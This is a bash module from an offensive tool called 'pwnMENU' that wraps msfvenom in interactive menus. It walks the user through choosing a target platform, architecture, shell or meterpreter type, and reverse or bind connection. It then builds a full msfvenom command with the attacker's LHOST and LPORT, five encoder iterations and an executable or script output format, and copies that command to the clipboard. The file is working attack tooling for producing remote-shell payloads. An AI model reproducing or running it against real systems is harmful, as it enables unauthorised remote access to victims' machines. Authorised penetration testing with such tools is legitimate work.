#!/bin/bash
####################### #### ## #  #
# >> pwnMENU - MSFVenom
################### #### ## #  #    #
#
# >> this file contains the "msfvenom" shell payload generator and all it's functions

msfv_main()
{
    app="msfvenom"
    if [ "$(app_exists $app)" == "" ]; then
        rf_msg "$(pfx -n "ERROR") $app does not exist on your system. please install to use this feature."
        menu_shells
    fi
    msfv_get_data
    get_ips
    get_ports

    options="$(pfx "PAYLOAD") $msfv_payload\n$(pfx "IP") $ip\n$(pfx "PORT") $port\n$(pfx "FORMAT") $format\n$(pfx "ENCODER") $encoder\n$(pfx "FILENAME") $name\n$lbrk\n$(pfx "GEN") generate msfvenom payload\n$(pfx "BACK") go back to main menu"

    select=$(echo -e "$options" | rf "MSFVENOM" "" 9)
    select=$(echo $select | awk '{print $1}')
	case $select in
		"PAYLOAD")
            msfv_payload
            ;;
		"IP")
            set_ip
            msfv_main
            ;;
		"PORT")
            set_port
            msfv_main
            ;;
		"FORMAT")
            if [ "$msfv_target" == "linux" ] || [ "$msfv_target" == *"bsd"* ]; then
                formats=$(cat $msfv_format_list | grep -v -e 'exe' -e 'asp' -e 'dll' -e 'msi' -e 'hta' -e 'vbs' -e 'vba' -e 'psh' -e 'macho' -e 'osx')
            elif [ "$msfv_target" == "windows" ]; then
                formats=$(cat $msfv_format_list | grep -v -e 'elf' -e 'osx' -e 'macho')
            elif [ "$msfv_target" == "osx" ]; then
                formats=$(cat $msfv_format_list | grep -v -e 'elf' -e 'exe' -e 'asp' -e 'dll' -e 'msi' -e 'hta' -e 'vbs' -e 'vba' -e 'psh')
            elif [ "$msfv_target" == "apple_ios" ]; then
                formats="macho"
                format="macho"
            elif [ "$msfv_target" == "android" ]; then
                formats="raw"
                format="raw"
            elif [ "$msfv_target" == "php" ]; then
                formats="raw"
                format="raw"
            elif [ "$msfv_target" == "r" ]; then
                formats="raw"
                format="raw"
            elif [ "$msfv_target" == "ruby" ]; then
                formats="raw"
                format="raw"
            fi

            format=$(echo -e "$formats" | rf "FORMAT")
            msfv_main
            ;;
		"ENCODER")
            notify "msfvenom encoder list (dependant on payload arch) updating... please wait."
            encoders="N/A\n"
            if [ "$msfv_target" == "php" ] || [ "$msfv_target" == "ruby" ]; then
                encoders=$encoders$(msfvenom --list encoder --arch $msfv_target | awk '{printf "(%s) %s\n", $2, $1}' | grep -v -e ' $' -e '-' -e 'Name' -e '=' -e 'Framework' -e 'manual' -e 'low' -e 'compatible' | sort)
            else
                encoders=$encoders$(msfvenom --list encoder --arch $msfv_arch | awk '{printf "(%s) %s\n", $2, $1}' | grep -v -e ' $' -e '-' -e 'Name' -e '=' -e 'Framework' -e 'manual' -e 'low' -e 'compatible' | sort)
            fi
            encoder=$(echo -e "$encoders" | rf "ENCODER")
            if [ "$encoder" != "N/A" ]; then
                encoder=$(echo $encoder | awk '{print $2}')
                check_encoder=$(msfvenom --list encoder | grep "$encoder" | wc -l)
                if [ $check_encoder -eq 0 ]; then
                    rf_msg "$(pfx -n "ERROR") invalid encoder selected - please select a valid encoder (or 'N/A' for no encoder)."
                    encoder=""
                fi
            fi
            msfv_main
            ;;
		"FILENAME")
            if [ "$format" = "" ]; then
                rf_msg "$(pfx -n "ERROR") you need to select a FORMAT first..."
                msfv_main
            fi

            name=$(echo -ne '' | rf "FILENAME")
            msfv_main
            ;;
		"GEN")
            if [ "$encoder" != "N/A" ]; then
                enc_cmd="-e $encoder -i 5 "
            else
                enc_cmd=""
            fi
            if [ "$msfv_arch" != "N/A" ]; then
                arch_cmd="-a $msfv_arch "
            else
                arch_cmd=""
            fi

            if [ "$msfv_target" == "apple_ios" ]; then
                ext=".ipa"
            elif [ "$msfv_target" == "android" ]; then
                ext=".apk"
            elif [ "$msfv_target" == "php" ]; then
                ext=".php"
            elif [ "$msfv_target" == "r" ]; then
                ext=".r"
            elif [ "$msfv_target" == "ruby" ]; then
                ext=".rb"
            fi

            if [ "$format" == *"-exe"* ]; then
                ext=".$(echo $format | sed 's/-/./g')"
            elif [ "$format" == *"exe"* ]; then
                ext=".exe"
            elif [ "$format" == *"msi"* ]; then
                ext=".msi"
            elif [ "$format" == *"-psh"* ]; then
                ext=".$(echo $format | sed 's/-/./g' | sed 's/psh/ps1/g')"
            elif [ "$format" == *"psh"* ]; then
                ext=".ps1"
            elif [ "$format" == *"vbs"* ]; then
                ext=".vbs"
            elif [ "$format" == *"python"* ]; then
                ext=".py"
            elif [ "$format" == "elf" ]; then
                ext=""
            elif [ "$format" == "elf-so" ]; then
                ext=".so"
            elif [ "$format" == "macho" ] || [ "$format" == "osx-app" ]; then
                ext=".bin"
            elif [ "$format" == "axis2" ]; then
                ext=".aar"
            elif [ "$format" != "raw" ]; then
                ext=".$(echo $format | sed 's/-/./g')"
            fi
            if [ $(echo $msfv_payload | grep "bind_tcp$" | wc -l) -eq 1 ]; then
                options="LPORT=$port"
            elif [ $(echo $msfv_payload | grep "reverse_tcp$" | wc -l) -eq 1 ]; then
                options="LHOST=$ip LPORT=$port"
            fi
            final_payload="msfvenom -p $msfv_payload $options --platform $msfv_target $arch_cmd$enc_cmd-f $format -o $name$ext"

            echo -n "$final_payload" | xclip -sel clip
            rf_msg "$(pfx -n "INFO") msfvenom command copied to the clipboard."
            ;;
		"BACK")
            menu_shells
            ;;
    esac
}

msfv_get_data()
{
    if [ ! -f "$msfv_payload_list" ] || [ ! -f "$msfv_arch_list" ]; then
        notify "msfvenom payload, arch and format lists are being generated... please wait."
        msfvenom --list payloads | awk '{print $1}' | grep -v -e ' ' -e '---' -e 'Name' -e '===' -e 'Framework' -e 'cmd/' | grep -e 'bind_tcp$' -e 'reverse_tcp$' | uniq > $msfv_payload_list
        msfvenom --list archs | awk '{print $1}' | grep -v -e ' ' -e '---' -e 'Name' -e '===' -e 'Framework' | uniq > $msfv_arch_list
        msfvenom --list format | awk '{print $1}' | grep -v -e '---' -e 'Name' -e '===' -e 'Framework' | awk -v RS= 'NR==1' > $msfv_format_list
    fi
}

msfv_payload()
{
    options="$(pfx "TARGET") $msfv_target\n$(pfx "ARCH") $msfv_arch\n$(pfx "TYPE") $msfv_type\n$(pfx "CONNECT") $msfv_conn\n$lbrk\n$(pfx "PAYLOAD") $msfv_payload\n$(pfx "SAVE") save payload\n$(pfx "BACK") go back (will not save!)"

    targets="$(grep . $msfv_payload_list | grep -v 'generic/' | awk -F '/' '{print $1}' | uniq | awk '{printf "%s\n", $1}')"

    select=$(echo -e "$options" | rf "PAYLOAD" "" 8)
    select=$(echo $select | awk '{print $1}')
	case $select in
		"TARGET")
            msfv_target=$(echo -e "$targets" | rf "TARGET")
            check_target=$(grep . $msfv_payload_list | awk -F '/' '{print $1}' | grep -o "$msfv_target" | uniq | wc -l)
            if [ $check_target -ne 1 ]; then
                rf_msg "$(pfx -n "ERROR") the selected target '$msfv_target' does not exist. please try again!"
                msfv_target=""
                msfv_payload
            fi
            if [ "$msfv_target" == "windows" ]; then
                arches="x86\nx64"
            else
                has_x86="$(cat $msfv_payload_list | grep "$msfv_target/x86/" | awk -F '/' '{printf "%s\n", $2}' | grep -v '_' | uniq)\n"
                has_x64="$(cat $msfv_payload_list | grep "$msfv_target/x64/" | awk -F '/' '{printf "%s\n", $2}' | grep -v '_' | uniq)\n"
                other_arches="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep -v -e '_' -e 'x86' -e 'x64' -e 'meterpreter' | grep -o -f $msfv_arch_list | uniq | sort)"
                arches="$has_x86$has_x64$other_arches"
                if [ "$arches" == "\n\n" ]; then
                    msfv_arch="N/A"
                    arches=""
                    has_shell="$(cat $msfv_payload_list | grep "$msfv_target/shell/" | awk -F '/' '{printf "%s\n", $2}' | grep -v '_' | uniq)\n"
                    has_met="$(cat $msfv_payload_list | grep "$msfv_target/meterpreter/" | awk -F '/' '{printf "%s\n", $2}' | grep -v '_' | uniq)\n"
                    other_types=$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep -v -e '_' -e 'shell' -e 'meterpreter' | uniq | sort)
                    types="N/A\n$has_shell$has_met$other_types"
                    if [ "$types" == "N/A\n\n\n" ]; then
                        msfv_type="N/A"
                        types=""
                    fi
                elif [ "$msfv_arch" == "N/A" ] && [ "$arches" != "\n\n" ]; then
                    msfv_arch=""
                fi
            fi
            msfv_payload
            ;;
        "ARCH")
            if [ "$arches" == "" ] && [ "$msfv_arch" != "N/A" ]; then
                rf_msg "$(pfx -n "ERROR") you need to select a TARGET first..."
            else
                if [ "$msfv_arch" == "N/A" ] && [ "$arches" == "" ]; then
                    rf_msg "$(pfx -n "ERROR") the selected target '$msfv_target' does not have any arches to select."
                else
                    lines=$(echo -e "$arches" | wc -l)
                    result=$(echo -e "$arches" | rf "ARCH" "" $lines)
                    if [ "$result" != "$msfv_arch" ]; then
                        msfv_type=""
                        msfv_conn=""
                    fi
                    msfv_arch="$result"
                    check_arch=$(grep . $msfv_payload_list | awk -F '/' '{print $2}' | grep "$msfv_arch" | uniq | wc -l)
                    if [ $check_arch -ne 1 ]; then
                        rf_msg "$(pfx -n "ERROR") the selected arch '$msfv_arch' does not exist. please try again!"
                        msfv_arch=""
                        msfv_payload
                    fi
                    if [ "$msfv_target" == "windows" ] && [ "$msfv_arch" == "x86" ]; then
                        has_shell="$(cat $msfv_payload_list | grep "$msfv_target/shell/" | awk -F '/' '{printf "%s\n", $3}' | grep -v '_' | uniq)\n"
                        has_met="$(cat $msfv_payload_list | grep "$msfv_target/meterpreter/" | awk -F '/' '{printf "%s\n", $3}' | grep -v '_' | uniq)\n"
                        other_types=$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $3}' | grep -v -e '_' -e 'shell' -e 'meterpreter' | uniq | sort)
                        types="N/A\n$has_shell$has_met$other_types"
                        if [ "$types" == "N/A\n\n\n" ]; then
                            msfv_type="N/A"
                        fi
                    else
                        has_shell="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/shell/" | awk -F '/' '{printf "%s\n", $3}' | grep -v '_' | uniq)\n"
                        has_met="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/meterpreter/" | awk -F '/' '{printf "%s\n", $3}' | grep -v '_' | uniq)\n"
                        other_types=$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/" | awk -F '/' '{printf "%s\n", $3}' | grep -v -e '_' -e 'shell' -e 'meterpreter' | uniq | sort)
                        types="N/A\n$has_shell$has_met$other_types"
                        if [ "$types" == "N/A\n\n\n" ]; then
                            msfv_type="N/A"
                        fi
                    fi
                fi
            fi
            msfv_payload
            ;;
        "TYPE")
            if [ "$types" == "" ] && [ "$msfv_type" != "N/A" ]; then
                rf_msg "$(pfx -n "ERROR") you need to select a valid ARCH (or TARGET without any arches) first..."
            elif [ "$types" == "" ] && [ "$msfv_type" == "N/A" ]; then
                rf_msg "$(pfx -n "ERROR") the selected target '$msfv_target' does not have any types to select."
            else
                types="$(echo -e "$types" | sed '/^$/d')"
                lines=$(echo -e "$types" | wc -l)
                result=$(echo -e "$types" | rf "TYPE" "" $lines)
                if [ "$result" != "$msfv_type" ]; then
                    msfv_conn=""
                fi
                msfv_type="$result"
                if [ "$msfv_type" != "N/A" ]; then
                    if [ "$msfv_arch" == "N/A" ]; then
                        check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_type/" | awk -F '/' '{print $2}' | uniq | wc -l)
                    elif [ "$msfv_arch" != "N/A" ]; then
                        check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_arch/$msfv_type/" | awk -F '/' '{print $3}' | uniq | wc -l)
                    fi
                    if [ $check_type -ne 1 ]; then
                        rf_msg "$(pfx -n "ERROR") the selected type '$msfv_type' does not exist. please try again!"
                        msfv_type=""
                        msfv_payload
                    fi
                fi
            fi
            msfv_payload
            ;;
        "CONNECT")
            if [ "$msfv_type" == "N/A" ]; then
                if [ "$msfv_arch" == "N/A" ]; then
                    has_shrev="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'shell_reverse_tcp$')\n"
                    has_shbind="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'shell_bind_tcp$')\n"
                    has_metrev="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'meterpreter_reverse_tcp$')\n"
                    has_metbind="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'meterpreter_bind_tcp$')\n"
                    other_conns=$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep '_' | grep -v -e 'shell_reverse_tcp$' -e 'shell_bind_tcp$' -e 'meterpreter_reverse_tcp$' -e 'meterpreter_bind_tcp$' | uniq | sort -r)
                    conns="$has_shrev$has_shbind$has_metrev$has_metbind$other_conns"
                elif [ "$msfv_arch" != "N/A" ]; then
                    has_shrev="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/" | awk -F '/' '{printf "%s\n", $3}' | grep 'shell_reverse_tcp$')\n"
                    has_shbind="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/" | awk -F '/' '{printf "%s\n", $3}' | grep 'shell_bind_tcp$')\n"
                    has_metrev="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/" | awk -F '/' '{printf "%s\n", $3}' | grep 'meterpreter_reverse_tcp$')\n"
                    has_metbind="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/" | awk -F '/' '{printf "%s\n", $3}' | grep 'meterpreter_bind_tcp$')\n"
                    other_conns=$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/" | awk -F '/' '{printf "%s\n", $3}' | grep '_' | grep -v -e 'shell_reverse_tcp$' -e 'shell_bind_tcp$' -e 'meterpreter_reverse_tcp$' -e 'meterpreter_bind_tcp$' | uniq | sort -r)
                    conns="$has_shrev$has_shbind$has_metrev$has_metbind$other_conns"
                elif [ "$msfv_target" == "windows" ] && [ "$msfv_arch" == "x86" ]; then
                    has_shrev="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'shell_reverse_tcp$')\n"
                    has_shbind="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'shell_bind_tcp$')\n"
                    has_metrev="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'meterpreter_reverse_tcp$')\n"
                    has_metbind="$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep 'meterpreter_bind_tcp$')\n"
                    other_conns=$(cat $msfv_payload_list | grep "$msfv_target/" | awk -F '/' '{printf "%s\n", $2}' | grep '_' | grep -v -e 'shell_reverse_tcp$' -e 'shell_bind_tcp$' -e 'meterpreter_reverse_tcp$' -e 'meterpreter_bind_tcp$' | uniq | sort -r)
                    conns="$has_shrev$has_shbind$has_metrev$has_metbind$other_conns"
                fi
            elif [ "$msfv_type" != "N/A" ]; then
                if [ "$msfv_arch" == "N/A" ]; then
                    has_rev="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_type/" | awk -F '/' '{printf "%s\n", $3}' | grep 'reverse_tcp$')\n"
                    has_bind="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_type/" | awk -F '/' '{printf "%s\n", $3}' | grep 'bind_tcp$')\n"
                    other_conns=$(cat $msfv_payload_list | grep "$msfv_target/$msfv_type/" | awk -F '/' '{printf "%s\n", $3}' | grep '_' | grep -v -e 'reverse_tcp$' -e 'bind_tcp$' | uniq | sort -r)
                    conns="$has_rev$has_bind$other_conns"
                elif [ "$msfv_arch" != "N/A" ]; then
                    has_rev="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/$msfv_type/" | awk -F '/' '{printf "%s\n", $4}' | grep 'reverse_tcp$')\n"
                    has_bind="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/$msfv_type/" | awk -F '/' '{printf "%s\n", $4}' | grep 'bind_tcp$')\n"
                    other_conns=$(cat $msfv_payload_list | grep "$msfv_target/$msfv_arch/$msfv_type/" | awk -F '/' '{printf "%s\n", $4}' | grep '_' | grep -v -e 'reverse_tcp$' -e 'bind_tcp$' | uniq | sort -r)
                    conns="$has_rev$has_bind$other_conns"
                elif [ "$msfv_target" == "windows" ] && [ "$msfv_arch" == "x86" ]; then
                    has_rev="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_type/" | awk -F '/' '{printf "%s\n", $3}' | grep 'reverse_tcp$')\n"
                    has_bind="$(cat $msfv_payload_list | grep "$msfv_target/$msfv_type/" | awk -F '/' '{printf "%s\n", $3}' | grep 'bind_tcp$')\n"
                    other_conns=$(cat $msfv_payload_list | grep "$msfv_target/$msfv_type/" | awk -F '/' '{printf "%s\n", $3}' | grep '_' | grep -v -e 'reverse_tcp$' -e 'bind_tcp$' | uniq | sort -r)
                    conns="$has_rev$has_bind$other_conns"
                fi
            fi
            conns="$(echo -e "$conns" | sed '/^$/d')"
            lines=$(echo -e "$conns" | wc -l)
            result=$(echo -e "$conns" | rf "CONNECT" "" $lines)
            if [ "$result" == "$msfv_conn" ]; then
                msfv_payload
            else
                msfv_conn="$result"
            fi
            if [ "$msfv_arch" == "N/A" ] && [ "$msfv_type" == "N/A" ]; then
                check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_conn" | awk -F '/' '{print $2}' | uniq | wc -l)
            elif [ "$msfv_arch" != "N/A" ] && [ "$msfv_type" == "N/A" ]; then
                check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_arch/$msfv_conn" | awk -F '/' '{print $3}' | uniq | wc -l)
            elif [ "$msfv_arch" == "N/A" ] && [ "$msfv_type" != "N/A" ]; then
                check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_type/$msfv_conn" | awk -F '/' '{print $3}' | uniq | wc -l)
            elif [ "$msfv_arch" != "N/A" ] && [ "$msfv_type" != "N/A" ]; then
                check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_arch/$msfv_type/$msfv_conn" | awk -F '/' '{print $4}' | uniq | wc -l)
            elif [ "$msfv_target" == "windows" ] && [ "$msfv_arch" == "x86" ] && [ "$msfv_type" != "N/A" ]; then
                check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_type/$msfv_conn" | awk -F '/' '{print $3}' | uniq | wc -l)
            elif [ "$msfv_target" == "windows" ] && [ "$msfv_arch" == "x86" ] && [ "$msfv_type" == "N/A" ]; then
                check_type=$(grep . $msfv_payload_list | grep "$msfv_target/$msfv_conn" | awk -F '/' '{print $2}' | uniq | wc -l)
            fi
            if [ $check_type -ne 1 ]; then
                rf_msg "$(pfx -n "ERROR") the selected connection type '$msfv_conn' does not exist. please try again!"
                msfv_conn=""
                msfv_payload
            fi
            if [ "$msfv_arch" == "N/A" ] && [ "$msfv_type" == "N/A" ]; then
                payload="$msfv_target/$msfv_conn"
            elif [ "$msfv_arch" != "N/A" ] && [ "$msfv_type" == "N/A" ]; then
                payload="$msfv_target/$msfv_arch/$msfv_conn"
            elif [ "$msfv_arch" == "N/A" ] && [ "$msfv_type" != "N/A" ]; then
                payload="$msfv_target/$msfv_type/$msfv_conn"
            elif [ "$msfv_target" == "windows" ] && [ "$msfv_arch" == "x86" ] && [ "$msfv_type" != "N/A" ]; then
                payload="$msfv_target/$msfv_type/$msfv_conn"
            elif [ "$msfv_target" == "windows" ] && [ "$msfv_arch" == "x86" ] && [ "$msfv_type" == "N/A" ]; then
                payload="$msfv_target/$msfv_conn"
            else
                payload="$msfv_target/$msfv_arch/$msfv_type/$msfv_conn"
            fi
            msfv_payload
            ;;
        "SAVE")
            check_payload=$(cat $msfv_payload_list | grep $payload | wc -l)
            if [ $check_payload -eq 1 ]; then
                msfv_payload=$payload
                rf_msg "$(pfx -n "INFO") payload '$msfv_payload' saved successfully."
                msfv_main
            else
                rf_msg "$(pfx -n "ERROR") selected payload '$payload' does not exist, please check your selections"
                msfv_payload
            fi
            ;;
        "BACK")
            msfv_main
            ;;
    esac
}
